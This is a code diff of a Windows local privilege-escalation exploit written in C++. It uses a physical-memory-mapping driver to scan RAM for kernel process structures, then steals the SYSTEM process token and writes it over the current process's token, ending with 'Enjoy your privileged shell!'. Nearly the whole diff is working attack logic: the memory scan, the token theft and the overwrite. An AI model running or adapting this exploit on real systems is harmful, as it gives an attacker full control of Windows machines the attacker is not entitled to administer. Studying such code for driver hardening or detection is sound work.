@@ -53,14 +53,14 @@ void InitPhysMemRanges()
 
 	for (int dwIndex = 0; dwIndex < count; dwIndex++)
 	{
-#if 0
-		pmem_ranges.emplace(*(uint64_t*)(pmi + 0), *(uint64_t*)(pmi + 8));
+#if 1
+		physmem_ranges.emplace(*(uint64_t*)(pmi + 0), *(uint64_t*)(pmi + 8));
 #else
 		auto page = (PhysicalMemoryPage*)(pmi - 4);
 		physmem_ranges.emplace(page->pBegin, page->size());
 #endif
 
-		std::cout << "page->pBegin " << std::hex << page->pBegin << "\n";
+		std::cout << "page->pBegin 0x" << std::hex << *(uint64_t*)(pmi + 0) << "psize 0x" << *(uint64_t*)(pmi + 8) << "\n";
 		pmi += 20;
 	}
 	delete[] data;
@@ -117,117 +117,109 @@ int main(int argc, char** argv)
 	// This is the input buffer used to communicate with the driver
 	auto inBuffer = new MapIoCmd;
 
-	inBuffer->chunk_num = 8;
-	inBuffer->chunk_size = 4;
-
 	// mapped_address will hold the pointer to the mapped kernel memory
 	uint8_t* mapped_address;
 	InitPhysMemRanges();
-	for (auto& range : physmem_ranges)
+
+	for (UINT64 phys_addr_iterator = 0; phys_addr_iterator < 0x110000000; phys_addr_iterator = phys_addr_iterator + BUFF_SIZE)
 	{
-		for (UINT64 phys_addr_iterator = range.first; phys_addr_iterator < range.first + range.second; phys_addr_iterator = phys_addr_iterator + BUFF_SIZE)
+		// setup phys_addr_iterator
+		auto address = (DWORD)phys_addr_iterator;
+
+		// talk with driver
+		mapped_address = MapPage(dev_handle, address);
+
+		if (mapped_address == NULL)
 		{
-			// setup phys_addr_iterator
-			inBuffer->address = phys_addr_iterator;
+			continue;
+		}
 
+		uintptr_t eproc_addr = NULL;
 
-			// talk with driver
-			mapped_address = MapMemory(dev_handle, inBuffer);
+		// iterate on the currently mapped blob
+		for (uintptr_t current_blob_iterator = 0; current_blob_iterator < BUFF_SIZE - 0x50; current_blob_iterator = current_blob_iterator + 0x10)
+		{
+			// temporary ptr to currently searched blob
+			auto current_blob_ptr = (uint32_t*)(mapped_address + current_blob_iterator);
 
-			if (mapped_address == NULL)
+			auto possible_eproc_pooltag = *(int32_t*)(current_blob_ptr + 4);
+
+			if (possible_eproc_pooltag && (possible_eproc_pooltag != 0xffffffff))
+			{
+				std::cout << "possible_eproc_pooltag: 0x" << std::hex << possible_eproc_pooltag << "\n";
+			}
+
+			// "Proc" pooltag	
+
+			if (possible_eproc_pooltag != 0x636f7250)
 			{
 				continue;
 			}
 
-			// print debug message from time to time
-			if (phys_addr_iterator % 0x1000000 == 0) printf("# Currently scanning : 0x%016I64X\n\n", phys_addr_iterator);
+			std::cout << "found possible eproc \n";
 
-			uintptr_t eproc_addr = NULL;
-
-			// iterate on the currently mapped blob
-			for (uintptr_t current_blob_iterator = 0; current_blob_iterator < BUFF_SIZE - 0x200; current_blob_iterator = current_blob_iterator + 0x10)
+			for (uint32_t blob_offset = 0; blob_offset < 0x200; ++blob_offset)
 			{
-				// temporary ptr to currently searched blob
-				auto current_blob_ptr = (uint32_t*)(mapped_address + current_blob_iterator);
+				uintptr_t possible_cr3 = *(uint32_t*)(current_blob_ptr + blob_offset);
 
-				// just in case, check if we can read the memory
-				if (IsBadReadPtr(current_blob_ptr, 4) == 0 && IsBadReadPtr(current_blob_ptr + 0x30, 8) == 0)
+				if (possible_cr3 == 0x1ad000)
 				{
-					std::cout << "Read blob is valid so far \n";
-
-					auto possible_eproc_pooltag = *(uint32_t*)(current_blob_ptr + 4);
-
-					// "Proc" pooltag	
-
-					if (possible_eproc_pooltag != 0x636f7250)
-					{
-						continue;
-					}
-
-					for (uint32_t blob_offset = 0; blob_offset < 0x200; ++blob_offset)
-					{
-						uintptr_t possible_cr3 = *(uint32_t*)(current_blob_ptr + blob_offset);
-
-						if (possible_cr3 == 0x1ad000)
-						{
-							/*	found an eprocess	*/
-							eproc_addr = (uintptr_t)current_blob_ptr + blob_offset;
-							break;
-						}
-					}
-
-					continue;
+					/*	found an eprocess	*/
+					eproc_addr = (uintptr_t)current_blob_ptr + blob_offset;
+					break;
 				}
-
 			}
-			if (eproc_addr)
-			{
-				printf("\tFOUND \"Proc\" tagged pool!\n\n");
-				printf("\t\tProcess name : ");
-				for (int i = 0; i < 15; i++)
-				{
-					std::cout << (*(char*)(eproc_addr + OFFSET::IMAGEFILENAME + i));
-				}
-				std::cout << "\n";
 
-				auto process_id = *(uint32_t*)(eproc_addr + OFFSET::UNIQUEPROCESSID);
+			continue;
+			
 
-				printf("\n");
-				printf("\t\tPID : %i\n", process_id);
-				printf("\t\tTOKEN : 0x%08I64X\n", *(DWORD*)(eproc_addr + OFFSET::TOKEN));
-				printf("\n");
-				Sleep(5000);
-
-				// Is this our current process we are looking for? (we first check if we found it already)
-				if (current_token_ptr == NULL && process_id == user_pid)
-				{
-					printf("\t\tFOUND current process! (storing address for later)\n\n");
-					current_token_ptr = phys_addr_iterator + eproc_addr + OFFSET::TOKEN;
-				}
-
-				// Is this the privileged process we are looking for ? (we first check if we found it already)
-				if (stolen_token == NULL && process_id == system_pid)
-				{
-					printf("\t\tFOUND privileged token! (saving token for later)\n\n");
-					stolen_token = *(DWORD*)(eproc_addr + OFFSET::TOKEN);
-				}
-
-				// Do we have all we need to privesc ?
-				if (stolen_token != NULL && current_token_ptr != NULL)
-				{
-					inBuffer->address = current_token_ptr;
-					mapped_address = (uint8_t*)MapMemory(dev_handle, inBuffer);
-					printf("Overwriting token of targeted process\n");
-					printf("OLD TOKEN : 0x%08I64X\n", *(DWORD*)mapped_address);
-					*(DWORD*)mapped_address = stolen_token;
-					printf("NEW TOKEN : 0x%08I64X\n", *(DWORD*)mapped_address);
-					printf("Enjoy your privileged shell!\n");
-					return 0;
-				}
-
-			}
-		
 		}
+		if (eproc_addr)
+		{
+			printf("\tFOUND \"Proc\" tagged pool!\n\n");
+			printf("\t\tProcess name : ");
+			for (int i = 0; i < 15; i++)
+			{
+				std::cout << (*(char*)(eproc_addr + OFFSET::IMAGEFILENAME + i));
+			}
+			std::cout << "\n";
+
+			auto process_id = *(uint32_t*)(eproc_addr + OFFSET::UNIQUEPROCESSID);
+
+			printf("\n");
+			printf("\t\tPID : %i\n", process_id);
+			printf("\t\tTOKEN : 0x%08I64X\n", *(DWORD*)(eproc_addr + OFFSET::TOKEN));
+			printf("\n");
+			Sleep(5000);
+
+			// Is this our current process we are looking for? (we first check if we found it already)
+			if (current_token_ptr == NULL && process_id == user_pid)
+			{
+				printf("\t\tFOUND current process! (storing address for later)\n\n");
+				current_token_ptr = phys_addr_iterator + eproc_addr + OFFSET::TOKEN;
+			}
+
+			// Is this the privileged process we are looking for ? (we first check if we found it already)
+			if (stolen_token == NULL && process_id == system_pid)
+			{
+				printf("\t\tFOUND privileged token! (saving token for later)\n\n");
+				stolen_token = *(DWORD*)(eproc_addr + OFFSET::TOKEN);
+			}
+
+			// Do we have all we need to privesc ?
+			if (stolen_token != NULL && current_token_ptr != NULL)
+			{
+				mapped_address = (uint8_t*)MapMemory(dev_handle, current_token_ptr);
+				printf("Overwriting token of targeted process\n");
+				printf("OLD TOKEN : 0x%08I64X\n", *(DWORD*)mapped_address);
+				*(DWORD*)mapped_address = stolen_token;
+				printf("NEW TOKEN : 0x%08I64X\n", *(DWORD*)mapped_address);
+				printf("Enjoy your privileged shell!\n");
+				return 0;
+			}
+
+		}
+		
 	}
 
 	printf("Exploit finished but the privilege escalation did not succeed.\n");
